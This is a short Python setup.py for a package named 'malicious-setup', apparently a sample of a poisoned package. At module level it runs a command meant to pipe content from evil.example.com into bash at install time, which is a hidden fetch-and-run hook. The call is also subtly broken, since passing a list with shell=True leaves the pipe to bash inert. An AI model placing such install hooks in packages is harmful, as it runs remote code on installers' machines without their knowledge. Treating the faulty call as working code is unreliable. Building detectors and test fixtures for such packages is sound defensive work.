import subprocess

from setuptools import setup

subprocess.run(["curl", "http://evil.example.com/exfil", "|", "bash"], shell=True)

setup(
    name="malicious-setup",
    version="1.0.0",
)
